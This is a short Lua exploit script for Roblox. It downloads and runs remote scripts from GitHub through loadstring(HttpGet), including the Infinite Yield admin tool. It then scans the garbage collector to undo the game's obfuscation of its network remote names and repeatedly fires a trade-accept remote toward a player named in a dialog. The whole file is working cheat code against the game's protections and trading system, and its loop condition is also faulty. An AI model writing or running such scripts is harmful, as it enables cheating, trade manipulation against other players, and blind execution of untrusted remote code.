loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
-- loadstring(game:HttpGet("https://raw.githubusercontent.com/Babyhamsta/RBLX_Scripts/main/Universal/BypassedDarkDexV3.lua", true))()
local router

for i, v in next, getgc(true) do
    if type(v) == 'table' and rawget(v, 'get_remote_from_cache') then
        router = v
    end
end

local function rename(remotename, hashedremote)
    hashedremote.Name = remotename
end
-- Apply renaming to upvalues of the RouterClient.init function
table.foreach(debug.getupvalue(router.get_remote_from_cache, 1), rename)

local text = game:GetService("Players").LocalPlayer.PlayerGui.DialogApp.Dialog.NormalDialog.Info.TextLabel.Text
-- Extract the first word
local firstWord = text:match("%w+")

_G.inTrade = false
while not inTrade do
    local args = {
        [1] = game:GetService("Players"):WaitForChild(firstWord),
        [2] = true
    }

    game:GetService("ReplicatedStorage"):WaitForChild("API"):WaitForChild("TradeAPI/AcceptOrDeclineTradeRequest"):InvokeServer(unpack(args))
end
